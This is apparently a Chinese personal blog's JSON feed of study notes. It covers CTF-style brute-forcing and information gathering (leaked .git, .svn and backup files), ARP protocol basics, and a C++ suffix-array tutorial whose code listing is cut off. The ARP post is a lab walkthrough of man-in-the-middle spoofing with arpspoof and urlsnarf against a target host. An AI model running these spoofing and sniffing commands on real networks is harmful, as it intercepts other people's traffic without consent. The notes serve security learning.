{
    "version": "https://jsonfeed.org/version/1",
    "title": null,
    "subtitle": "翩若浮云着霓裳，落幕鬓边皆染霜",
    "icon": "https://mangpumo.github.io/images/favicon.ico",
    "description": "欢迎来到 Mang Pumo 的个人博客!",
    "home_page_url": "https://MangPumo.github.io",
    "items": [
        {
            "id": "https://mangpumo.github.io/2023/01/21/Web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/",
            "url": "https://mangpumo.github.io/2023/01/21/Web%E5%85%A5%E9%97%A8-%E7%88%86%E7%A0%B4/",
            "title": "Web入门_爆破",
            "date_published": "2023-01-21T10:58:58.000Z",
            "content_html": "<h1 id=\"爆破\"><a href=\"#爆破\" class=\"headerlink\" title=\"爆破\"></a>爆破</h1><ul>\n<li><p>tomcat 认证爆破之custom iterator使用，下载密码字典抓包，通过burpsuite暴力破解，<br>Payload set —-&gt;custom iterator(自定义迭代器)，<br>需要进行base64编码；payload processing 进行编码设置，<br>取消Palyload Encoding编码 因为在进行base64加密的时候在最后可能存在 &#x3D;&#x3D; 这样就会影响base64 加密的结果，</p>\n</li>\n<li><p>爆破域名</p>\n</li>\n<li><p>爆破TOKEN值</p>\n</li>\n<li><p>参考PHP随机数的伪随机数 mt_srand(seed); 函数播种 Mersenne Twister 随机数生成器。seed,可选。规定播种值</p>\n</li>\n<li><p>Chrome浏览器抓包，进行暴力破解密码</p>\n</li>\n<li><p>通过暴力破解目录看返回数据包</p>\n</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/21/Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/",
            "url": "https://mangpumo.github.io/2023/01/21/Web%E5%85%A5%E9%97%A8-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/",
            "title": "Web入门_信息搜集",
            "date_published": "2023-01-21T09:49:14.000Z",
            "content_html": "<h1 id=\"信息搜集\"><a href=\"#信息搜集\" class=\"headerlink\" title=\"信息搜集\"></a>信息搜集</h1><h2 id=\"查看源代码\"><a href=\"#查看源代码\" class=\"headerlink\" title=\"查看源代码\"></a>查看源代码</h2><ul>\n<li>右键-查看源代码</li>\n<li>通过在url头部添加 view-source:</li>\n</ul>\n<h2 id=\"抓包\"><a href=\"#抓包\" class=\"headerlink\" title=\"抓包\"></a>抓包</h2><ul>\n<li>通过burpsuite抓包 flag在返回的响应数据包里面</li>\n<li>cookie，直接抓包，在请求数据包看到flag,注{ }通过了url编码</li>\n</ul>\n<h2 id=\"敏感文件\"><a href=\"#敏感文件\" class=\"headerlink\" title=\"敏感文件\"></a>敏感文件</h2><ul>\n<li>robots.txt文件，直接访问url&#x2F;robots.txt获得flag</li>\n<li>phps文件泄露，直接访问index.phps。获得flag</li>\n<li>代码泄露。直接访问url&#x2F;<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy56aXAs6I635b6XZmxhZy8=\">www.zip,获得flag</span></li>\n<li>git代码泄露，直接访问url&#x2F;.git&#x2F;index.php</li>\n<li>信息svn泄露,直接访问url&#x2F;.svn&#x2F;</li>\n<li>vim缓存信息泄露，直接访问url&#x2F;index.php.swp 注：上面的信息泄露可以参考 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2E1OTc5MzQ0NDgvYXJ0aWNsZS9kZXRhaWxzLzEwNTQzMTM2Nw==\">https://blog.csdn.net/a597934448/article/details/105431367</span></li>\n</ul>\n<h2 id=\"其他\"><a href=\"#其他\" class=\"headerlink\" title=\"其他\"></a>其他</h2><ul>\n<li>通过dns检查查询flag <span class=\"exturl\" data-url=\"aHR0cHM6Ly96aWppYW4uYWxpeXVuLmNvbS8=\">https://zijian.aliyun.com/</span> TXT 记录，一般指为某个主机名或域名设置的说明。查找xx.xx.com域名下的txt记录</li>\n<li>网站上的公开信息，就是管理员常用密码</li>\n<li>技术文档 在页面下面发现 document 下载发现里面存在后台地址和用户名密码登录成功获 得flag</li>\n<li>有时候源码里面就能不经意间泄露重要(editor)的信息，直接在url后面添加&#x2F;editor 然后查看flag路径并且访问</li>\n<li>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</li>\n<li>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露。php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加&#x2F;tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</li>\n<li>备份的sql文件会泄露敏感信息，backuo.sql</li>\n<li>查看JS文件</li>\n<li>前端元素泄漏密钥</li>\n<li>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加&#x2F;db&#x2F;db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag</li>\n</ul>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/ARP%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/",
            "url": "https://mangpumo.github.io/2023/01/14/ARP%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/",
            "title": "ARP攻击流量分析",
            "date_published": "2023-01-14T06:44:01.000Z",
            "content_html": "<h1 id=\"ARP攻击-流量分析\"><a href=\"#ARP攻击-流量分析\" class=\"headerlink\" title=\"ARP攻击-流量分析\"></a>ARP攻击-流量分析</h1><h2 id=\"1-课前准备\"><a href=\"#1-课前准备\" class=\"headerlink\" title=\"1.课前准备\"></a>1.课前准备</h2><p>1.kali作为攻击机</p>\n<p>2.win10作为靶机</p>\n<h2 id=\"2-kali数据包转发\"><a href=\"#2-kali数据包转发\" class=\"headerlink\" title=\"2.kali数据包转发\"></a>2.kali数据包转发</h2><p>出于安全考虑，Linux系统默认是禁止数据包转发的。所谓转发即当主机拥有多于一块的网卡时，其中一块收到数据包，根据数据包的目的ip地址将数据包发往本机另一块网卡，该网卡根据路由表继续发送数据包。这通常是路由器所要实现的功能。我们需要手动开启转发功能。</p>\n<p><strong>1.如何开启通信转发？</strong></p>\n<p>kali里有个ip_forward 配置文件 </p>\n<p>1.默认是0 禁止端口转发</p>\n<p>2.将其设置成1 开启端口转发</p>\n<p><strong>2.开启步骤</strong></p>\n<p>1.查看当前是否开启了端口转发</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /proc/sys/net/ipv4/ip_forward </span><br></pre></td></tr></table></figure>\n\n<p>2.开启通信转发的命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>\n\n<p>3.使用arpspoof发起ARP攻击</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arpspoof -i eth0 -r 192.168.110.1 -t 192.168.110.11</span><br></pre></td></tr></table></figure>\n\n<p>4.win10验证是否转发成功</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">访问：https://www.mashibing.com/</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-dsniff工具\"><a href=\"#3-dsniff工具\" class=\"headerlink\" title=\"3.dsniff工具\"></a>3.dsniff工具</h2><p><strong>1.工具介绍</strong></p>\n<p>Dsniff是一个基于unix系统网络嗅探工具，工具集包含两个我们需要的两个工具包，arpspoof 和urlsnarf。              </p>\n<p><strong>2.安装方法</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install dsniff</span><br></pre></td></tr></table></figure>\n\n<p>3.urlsnarf工具介绍</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">urlsnarf -h</span><br><span class=\"line\">urlsnarf [-n] [-i interface | -p pcapfile] [[-v] pattern [expression]]</span><br><span class=\"line\"></span><br><span class=\"line\">-n 表示不反查主机名</span><br><span class=\"line\">-i interface 网卡接口名</span><br><span class=\"line\">-p pattern 表示对过滤的内容使用的正则表达式</span><br><span class=\"line\">-v表示取相反，即是不匹配；expression 是过滤语法，和tcpdump的相同，请参考tcpdump。</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"4-url流量分析\"><a href=\"#4-url流量分析\" class=\"headerlink\" title=\"4.url流量分析\"></a>4.url流量分析</h2><p><strong>1.概念</strong></p>\n<p>URL流量嗅探操作非常类似于中间人攻击，通过目标主机将路由流量注入到因特网。该过程将通过ARP注入实现攻击。url嗅探能够实时跟踪电脑中的数据流量信息，并且分析出它的类型和去向。从而获得你上网信息。</p>\n<p><strong>2.攻击流程</strong></p>\n<p>1.开启流量转发</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>\n\n<p>2.开启ARP攻击</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arpspoof -i eth0 -r 192.168.110.1 -t 192.168.110.11</span><br></pre></td></tr></table></figure>\n\n<p>3.捕获目标计算机的url</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">urlsnarf -i eth0</span><br></pre></td></tr></table></figure>\n\n<p>4.靶机上网，访问网站</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.http://www.kangda.cn/#/user/login?redirect=http%3A%2F%2Fwww.kangda.cn%2F%23%2F</span><br><span class=\"line\">2.http://blog.tianya.cn/</span><br></pre></td></tr></table></figure>\n\n<p>5.kali分析用户请求</p>\n<h2 id=\"5-课堂小结\"><a href=\"#5-课堂小结\" class=\"headerlink\" title=\"5.课堂小结\"></a>5.课堂小结</h2><p>请看ARP流量分析课后笔记.xmind</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/ARP%E5%8D%8F%E8%AE%AE/",
            "url": "https://mangpumo.github.io/2023/01/14/ARP%E5%8D%8F%E8%AE%AE/",
            "title": "ARP协议",
            "date_published": "2023-01-14T06:11:19.000Z",
            "content_html": "<h1 id=\"ARP协议\"><a href=\"#ARP协议\" class=\"headerlink\" title=\"ARP协议\"></a>ARP协议</h1><h2 id=\"一-课前准备\"><a href=\"#一-课前准备\" class=\"headerlink\" title=\"一.课前准备\"></a>一.课前准备</h2><p>1.准备kali虚拟机 （原理演示机）</p>\n<p>2.准备centos7虚拟机 （靶机）</p>\n<h2 id=\"二-ARP协议工作原理\"><a href=\"#二-ARP协议工作原理\" class=\"headerlink\" title=\"二.ARP协议工作原理\"></a>二.ARP协议工作原理</h2><h4 id=\"什么是ARP\"><a href=\"#什么是ARP\" class=\"headerlink\" title=\"什么是ARP\"></a>什么是ARP</h4><p>地址解析协议，即ARP（Address Resolution Protocol），是根据<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9JUCVFNSU5QyVCMCVFNSU5RCU4MA==\">IP地址</span>获取<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS8lRTclODklQTklRTclOTAlODYlRTUlOUMlQjAlRTUlOUQlODAvMjEyOQ==\">物理地址</span>的一个<span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9UQ1AlMkZJUCVFNSU4RCU4RiVFOCVBRSVBRQ==\">TCP&#x2F;IP协议</span>。</p>\n<h4 id=\"工作原理\"><a href=\"#工作原理\" class=\"headerlink\" title=\"工作原理\"></a>工作原理</h4><p>ARP协议规定,每台计算机都需要一个ARP表,用来保存IP地址和MAC地址的映射关系 。访问IP地址的时候就去查ARP表,从而找到对应的MAC地址。</p>\n<p>如果ARP表中匹配不到,就会使用广播的方式发送一个ARP请求 ，目标主机收到请求后会使用单播的方式返回一个ARP响应,告知自己的MAC地址 。</p>\n<p>拿到MAC地址后,会将映射关系缓存到ARP表,而后传递到数据链路层进行解析转换。</p>\n<h2 id=\"三-ARP-协议的作用\"><a href=\"#三-ARP-协议的作用\" class=\"headerlink\" title=\"三.ARP 协议的作用\"></a>三.ARP 协议的作用</h2><p>网络中的数据传输所依赖的是MAC地址而不是IP地址，ARP协议负责将IP地址转换为MAC地址。</p>\n<p>ARP协议的主要工作就是建立、查询、更新、删除ARP表项。</p>\n<h2 id=\"四-ARP常用命令\"><a href=\"#四-ARP常用命令\" class=\"headerlink\" title=\"四.ARP常用命令\"></a>四.ARP常用命令</h2><ol>\n<li>查询arp表：</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -a   </span><br></pre></td></tr></table></figure>\n\n<p><img data-src=\"/.%5Cimage-20211018181543457.png\" alt=\"image-20211018181543457\"></p>\n<p>2.删除表内某个IP</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -d IP      </span><br></pre></td></tr></table></figure>\n\n<p>3.tcp抓某块网卡的所有arp请求  </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 -nn arp     </span><br></pre></td></tr></table></figure>\n\n<p>4.tcp抓取指定ip的请求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 -nn arp  and host IP     </span><br></pre></td></tr></table></figure>\n\n<p>​         </p>\n<h2 id=\"五-ARP工作过程演示\"><a href=\"#五-ARP工作过程演示\" class=\"headerlink\" title=\"五.ARP工作过程演示\"></a>五.ARP工作过程演示</h2><p>在centos7上通过抓包来了解arp的工作过程：</p>\n<p>1.首先查看一下该机器有没有 ip:192.168.110.13 的mac地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -a</span><br><span class=\"line\">如果存在则先删除掉</span><br><span class=\"line\">arp -d IP</span><br></pre></td></tr></table></figure>\n\n<p>2.在centos7上抓包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcpdump -i eth0 -nn arp  或者 tcpdump -i eth0 -nn arp and host 192.168.110.13</span><br></pre></td></tr></table></figure>\n\n<p>3.ping一下该ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ping 192.168.110.13</span><br></pre></td></tr></table></figure>\n\n<p>4.查看抓包结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">06:07:58.827256 ARP, Request who-has 192.168.110.13 tell 192.168.110.26, length 28</span><br><span class=\"line\">这句话的意思是，请问谁是192.168.110.13 ，请将你的mac地址告诉给 192.168.110.26</span><br><span class=\"line\"></span><br><span class=\"line\">06:07:58.827858 ARP, Reply 192.168.110.13 is-at 00:0c:29:90:e6:8d, length 46</span><br><span class=\"line\">这句话的意思是，我是92.168.110.13，我的mac地址是：00:0c:29:90:e6:8d</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>5.查看最新的ARP表，看看是否绑定了mac地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">arp -a</span><br><span class=\"line\"></span><br><span class=\"line\">? (192.168.110.13) at 00:0c:29:90:e6:8d [ether] on eth0</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>6.ARP的请求是一直不间断的在自动发送的，一台计算机会通信进行以下过程</p>\n<p>1.主动询问网段下的IP的MAC地址</p>\n<p>2.主动告诉别人我的IP和MAC地址</p>\n<p>3.根据应答结果实时更新ARP表的绑定关系</p>\n<h2 id=\"六-课堂总结\"><a href=\"#六-课堂总结\" class=\"headerlink\" title=\"六.课堂总结\"></a>六.课堂总结</h2><p>1.ARP协议负责将IP地址转换为MAC地址。或者说 ARP协议负责将IP地址和MAC地址进行绑定。</p>\n<p>2.ARP协议的主要工作就是建立、查询、更新、删除ARP表项。</p>\n<p>3.ARP的特性：无需人为干预，一直在进行轮询和应答</p>\n",
            "tags": []
        },
        {
            "id": "https://mangpumo.github.io/2023/01/14/CPP%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84/",
            "url": "https://mangpumo.github.io/2023/01/14/CPP%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84/",
            "title": "CPP后缀数组",
            "date_published": "2023-01-13T20:10:20.000Z",
            "content_html": "<h1 id=\"为什么学后缀数组\"><a href=\"#为什么学后缀数组\" class=\"headerlink\" title=\"为什么学后缀数组\"></a>为什么学后缀数组</h1><p>后缀数组是一个比较强大的处理字符串的算法，是有关字符串的基础算法，所以必须掌握。<br>学会后缀自动机(SAM)就不用学后缀数组(SA)了？不，虽然SAM看起来更为强大和全面，但是有些SAM解决不了的问题能被SA解决，只掌握SAM是远远不够的。  </p>\n<p>有什么SAM做不了的例子？<br>比如果求一个串后缀的lcp方面的应用，这是SA可以很方便的用rmq来维护，但是SAM还要求lca，比较麻烦，还有就是字符集比较大的时候SA也有优势。  </p>\n<p>现在这里放道题，看完这个blog可能就会做了！：<br>你可想想这道题：你有一个01串S，然后定义一个前缀最右边的位置就是这个前缀的结束位置。现在有q多个询问，每个询问结束位置在l~r中不同前缀的最长公共后缀是多长？<br>|S|,q≤100000|S|,q≤100000  </p>\n<p>时限4s  </p>\n<p>而下面是我对后缀数组的一些理解  </p>\n<h1 id=\"构造后缀数组——SA\"><a href=\"#构造后缀数组——SA\" class=\"headerlink\" title=\"构造后缀数组——SA\"></a>构造后缀数组——SA</h1><h2 id=\"先定义一些变量的含义\"><a href=\"#先定义一些变量的含义\" class=\"headerlink\" title=\"先定义一些变量的含义\"></a>先定义一些变量的含义</h2><p>Str ：需要处理的字符串(长度为Len)<br>Suffix[i] ：Str下标为i ~ Len的连续子串(即后缀)<br>Rank[i] : Suffix[i]在所有后缀中的排名<br>SA[i] : 满足Suffix[SA[1]] &lt; Suffix[SA[2]] …… &lt; Suffix[SA[Len]],即排名为i的后缀为Suffix[SA[i]] (与Rank是互逆运算)<br>好，来形象的理解一下  </p>\n<p><img data-src=\"https://img-blog.csdn.net/20160205125505545\"></p>\n<p>后缀数组指的就是这个SA[i],有了它，我们就可以实现一些很强大的功能(如不相同子串个数、连续重复子串等)。如何快速的到它，便成为了这个算法的关键。而SA和Rank是互逆的，只要求出任意一个，另一个就可以O(Len)得到。<br>现在比较主流的算法有两种，倍增和DC3，在这里，就主要讲一下稍微慢一些，但比较好实现以及理解的倍增算法(虽说慢，但也是O(Len logLen))的。  </p>\n<h2 id=\"进入正题——倍增算法\"><a href=\"#进入正题——倍增算法\" class=\"headerlink\" title=\"进入正题——倍增算法\"></a>进入正题——倍增算法</h2><p>倍增算法的主要思想 ：对于一个后缀Suffix[i],如果想直接得到Rank比较困难，但是我们可以对每个字符开始的长度为2k2k的字符串求出排名，k从0开始每次递增1(每递增1就成为一轮)，当2k2k大于Len时，所得到的序列就是Rank，而SA也就知道了。O(logLen)枚举k<br>这样做有什么好处呢？<br>设每一轮得到的序列为rank(注意r是小写，最终后缀排名Rank是大写)。有一个很美妙的性质就出现了！第k轮的rank可由第k - 1轮的rank快速得来!<br>为什么呢？为了方便描述，设SubStr(i, len)为从第i个字符开始，长度为len的字符串我们可以把第k轮SubStr(i, 2k2k)看成是一个由SubStr(i, 2k−12k−1)和SubStr(i + 2k−12k−1, 2k−12k−1)拼起来的东西。类似rmq算法，这两个长度而2k−12k−1的字符串是上一轮遇到过的！当然上一轮的rank也知道！那么吧每个这一轮的字符串都转化为这种形式，并且大家都知道字符串的比较是从左往右，左边和右边的大小我们可以用上一轮的rank表示，那么……这不就是一些两位数(也可以视为第一关键字和第二关键字)比较大小吗!再把这些两位数重新排名就是这一轮的rank。<br>我们用下面这张经典的图理解一下：  </p>\n<p><img data-src=\"https://img-blog.csdn.net/20160205125603928\"></p>\n<p>相信只要理解字符串的比较法则(跟实数差不多)，理解起来并不难。#还有一个细节就是怎么把这些两位数排序？这种位数少的数进行排序毫无疑问的要用一个复杂度为长度*排序数的个数的优美算法——基数排序(对于两位数的数复杂度就是O(Len)的)。<br>基数排序原理 ： 把数字依次按照由低位到高位依次排序，排序时只看当前位。对于每一位排序时，因为上一位已经是有序的，所以这一位相等或符合大小条件时就不用交换位置，如果不符合大小条件就交换，实现可以用”桶”来做。(叙说起来比较奇怪，看完下面的代码应该更好理解，也可以上网查有关资料)<br>好了SA和Rank(大写R)到此为止就处理好了。(下面有详解代码！)。但我们发现，只有这两样东西好像没什么用，为了处理重复子串之类的问题，我们就要引入一个表示最长公共前缀的新助手Height数组！  </p>\n<h1 id=\"构造最长公共前缀——Height\"><a href=\"#构造最长公共前缀——Height\" class=\"headerlink\" title=\"构造最长公共前缀——Height\"></a>构造最长公共前缀——Height</h1><h2 id=\"同样先是定义一些变量\"><a href=\"#同样先是定义一些变量\" class=\"headerlink\" title=\"同样先是定义一些变量\"></a>同样先是定义一些变量</h2><p>Heigth[i] : 表示Suffix[SA[i]]和Suffix[SA[i - 1]]的最长公共前缀，也就是排名相邻的两个后缀的最长公共前缀<br>H[i] : 等于Height[Rank[i]]，也就是后缀Suffix[i]和它前一名的后缀的最长公共前缀<br>而两个排名不相邻的最长公共前缀定义为排名在它们之间的Height的最小值。<br>跟上面一样，先形像的理解一下：  </p>\n<p><img data-src=\"https://img-blog.csdn.net/20160205125636006\"></p>\n<h2 id=\"高效地得到Height数组\"><a href=\"#高效地得到Height数组\" class=\"headerlink\" title=\"高效地得到Height数组\"></a>高效地得到Height数组</h2><p>如果一个一个数按SA中的顺序比较的话复杂度是O(N2N2)级别的，想要快速的得到Height就需要用到一个关于H数组的性质。<br>H[i] ≥ H[i - 1] - 1!<br>如果上面这个性质是对的，那我们可以按照H[1]、H[2]……H[Len]的顺序进行计算，那么复杂度就降为O(N)了！<br>让我们尝试一下证明这个性质 : 设Suffix[k]是排在Suffix[i - 1]前一名的后缀，则它们的最长公共前缀是H[i - 1]。都去掉第一个字符，就变成Suffix[k + 1]和Suffix[i]。如果H[i - 1] &#x3D; 0或1,那么H[i] ≥ 0显然成立。否则，H[i] ≥ H[i - 1] - 1(去掉了原来的第一个,其他前缀一样相等)，所以Suffix[i]和在它前一名的后缀的最长公共前缀至少是H[i - 1] - 1。<br>仔细想想还是比较好理解的。H求出来，那Height就相应的求出来了，这样结合SA，Rank和Height我们就可以做很多关于字符串的题了！  </p>\n<h1 id=\"代码——Code\"><a href=\"#代码——Code\" class=\"headerlink\" title=\"代码——Code\"></a>代码——Code</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/*</span><br><span class=\"line\">    Problem: JZOJ1598(询问一个字符串中有多少至少出现两次的子串)</span><br><span class=\"line\">    Content: SA&#x27;s Code and Explanation</span><br><span class=\"line\">    Author : YxuanwKeith</span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\">#include &lt;cstring&gt;</span><br><span class=\"line\">#include &lt;algorithm&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">const int MAXN = 100005;</span><br><span class=\"line\"></span><br><span class=\"line\">char ch[MAXN], All[MAXN];</span><br><span class=\"line\">int SA[MAXN], rank[MAXN], Height[MAXN], tax[MAXN], tp[MAXN], a[MAXN], n, m; </span><br><span class=\"line\">char str[MAXN];</span><br><span class=\"line\">//rank[i] 第i个后缀的排名; SA[i] 排名为i的后缀位置; Height[i] 排名为i的后缀与排名为(i-1)的后缀的LCP</span><br><span class=\"line\">//tax[i] 计数排序辅助数组; tp[i] rank的辅助数组(计数排序中的第二关键字),与SA意义一样。</span><br><span class=\"line\">//a为原串</span><br><span class=\"line\">void RSort() &#123;</span><br><span class=\"line\">    //rank第一关键字,tp第二关键字。</span><br><span class=\"line\">    for (int i = 0; i &lt;= m; i ++) tax[i] = 0;</span><br><span class=\"line\">    for (int i = 1; i &lt;= n; i ++) tax[rank[tp[i]]] ++;</span><br><span class=\"line\">    for (int i = 1; i &lt;= m; i ++) tax[i] += tax[i-1];</span><br><span class=\"line\">    for (int i = n; i &gt;= 1; i --) SA[tax[rank[tp[i]]] --] = tp[i]; //确保满足第一关键字的同时，再满足第二关键字的要求</span><br><span class=\"line\">&#125; //计数排序,把新的二元组排序。</span><br><span class=\"line\"></span><br><span class=\"line\">int cmp(int *f, int x, int y, int w) &#123; return f[x] == f[y] &amp;&amp; f[x + w] == f[y + w]; &#125; </span><br><span class=\"line\">//通过二元组两个下标的比较，确定两个子串是否相同</span><br><span class=\"line\"></span><br><span class=\"line\">void Suffix() &#123;</span><br><span class=\"line\">    //SA</span><br><span class=\"line\">    for (int i = 1; i &lt;= n; i ++) rank[i] = a[i], tp[i] = i;</span><br><span class=\"line\">    m = 127 ,RSort(); //一开始是以单个字符为单位，所以(m = 127)</span><br><span class=\"line\"></span><br><span class=\"line\">    for (int w = 1, p = 1, i; p &lt; n; w += w, m = p) &#123; //把子串长度翻倍,更新rank</span><br><span class=\"line\"></span><br><span class=\"line\">        //w 当前一个子串的长度; m 当前离散后的排名种类数</span><br><span class=\"line\">        //当前的tp(第二关键字)可直接由上一次的SA的得到</span><br><span class=\"line\">        for (p = 0, i = n - w + 1; i &lt;= n; i ++) tp[++ p] = i; //长度越界,第二关键字为0</span><br><span class=\"line\">        for (i = 1; i &lt;= n; i ++) if (SA[i] &gt; w) tp[++ p] = SA[i] - w;</span><br><span class=\"line\"></span><br><span class=\"line\">        //更新SA值,并用tp暂时存下上一轮的rank(用于cmp比较)</span><br><span class=\"line\">        RSort(), swap(rank, tp), rank[SA[1]] = p = 1;</span><br><span class=\"line\"></span><br><span class=\"line\">        //用已经完成的SA来更新与它互逆的rank,并离散rank</span><br><span class=\"line\">        for (i = 2; i &lt;= n; i ++) rank[SA[i]] = cmp(tp, SA[i], SA[i - 1], w) ? p : ++ p;</span><br><span class=\"line\">    &#125;</span><br><span 